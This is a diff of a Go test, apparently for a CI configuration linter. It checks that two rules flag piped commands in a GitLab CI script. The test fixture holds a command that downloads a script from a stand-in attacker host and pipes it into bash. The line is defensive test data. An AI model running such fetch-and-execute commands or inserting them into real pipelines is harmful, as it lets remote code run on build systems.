@@ -79,13 +79,14 @@ build:
     - echo safe
   script:
     - curl -s http://evil.example/x.sh | bash
+    - sh -c "make | tee build.log"
 `), "test.yml")
 	if err != nil {
 		t.Fatal(err)
 	}
 	for _, r := range []rule.Rule{GL011, GL024} {
 		if len(Check(r, doc, "test.yml")) == 0 {
-			t.Errorf("%s misses the curl | bash in the last script:", r.ID())
+			t.Errorf("%s misses the pipe in the last script:", r.ID())
 		}
 	}
 }
